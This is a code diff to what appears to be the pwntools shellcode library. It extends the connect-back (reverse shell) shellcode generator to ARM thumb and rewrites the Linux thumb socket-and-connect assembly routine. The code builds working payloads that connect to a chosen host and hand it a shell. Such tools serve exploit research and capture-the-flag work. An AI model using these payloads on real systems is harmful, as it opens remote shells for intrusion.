@@ -1,11 +1,11 @@
 from pwn.internal.shellcode_helper import *
 from .. import dupsh, pushstr
 
-@shellcode_reqs(arch=['i386', 'amd64'], os=['linux', 'freebsd'], network='ipv4')
-def connectback(host, port):
+@shellcode_reqs(arch=['i386', 'amd64', 'thumb'], os=['linux', 'freebsd'], network='ipv4')
+def connectback(host, port, sock = False):
     """Args: host, port
     Standard connect back type shellcode."""
-    return connect(host, port), dupsh()
+    return connect(host, port), dupsh(sock = sock)
 
 @shellcode_reqs(arch=['i386', 'amd64', 'thumb'], os=['linux', 'freebsd'], network='ipv4')
 def connect(host, port, arch = None, os = None):
@@ -28,50 +28,42 @@ def connect(host, port, arch = None, os = None):
         no_support('connect', os, arch)
 
 def _connect_linux_thumb(host, port):
-		return """
-						/* Connect to %(hostname)s on %(portnum)d */
-						/* Socket file desciptor is placed in r6 */
+		def mov(r, v):
+				return pwn.shellcode.mov(r, v, raw = True)
 
-						/* To avoid null bytes we must first set sa_family in sockaddr struct */
-						mov r1, #AF_INET
-						lsl r1, #16
-						mov r2, pc
-						add r2, #4
-						str r1, [r2, #24]
 
-						/* sock = socket(AF_INET, SOCK_STREAM, 0) */
-						mov r0, #AF_INET
-						mov r1, #1
-						sub r2, r2, r2
+		out = mov('r0', 'AF_INET')
+		out+= mov('r1', 'SOCK_STREAM')
+		out+= mov('r2', 0)
+		out+= mov('r7', '281') # Implement SYS_SOCKET 
 
-						/* SYS_socket = 281 */
-						lsl r7, r1, #8
-						add r7, r7, #25
-						svc 1
+		out+= """
+					svc 1
+					adr r1, sockaddr
+					"""
 
-						/* save fd in r6 */
-						mov r6, r0
+		out+= mov('r2', 16)
+		out+= mov('r3', 'AF_INET')
+		
+		out+= mov('r6', 'r0')
 
-						/* connect(r0, &addr, 16) */
-						add r1, pc, #8
-						add r1, r1, #2
-						add r2, #16
-						add r7, #2
-						svc 1
-
-						b connect_end
-
-						/* Dummy for placing AF_INET */
-						.byte 65,65,65,65
-						.short %(port)d
-						.byte %(host)s
-
-						connect_end:
-""" % {'hostname': host,
-			 'portnum' : port,
-			 'host'    : host.replace('.',','),
-			 'port'    : htons(port)
-			 }
+		out+= """
+					strh r3, [r1]
+					b after_sockaddr
+					sub r1,r1,r1
+					"""
+		out+="""
+				sockaddr:
+					.short 0x4141
+					.short %(port)d
+					.word 0x%(host)08x
+				after_sockaddr:
+					add r7, #2
+					svc 1
+					""" % {'host': ip(host),
+								 'port': htons(port)}
+		return out
+					
 def _connect_linux_i386(host, port):
     return """
             ;; Connect to %(hostname)s on %(portnum)d
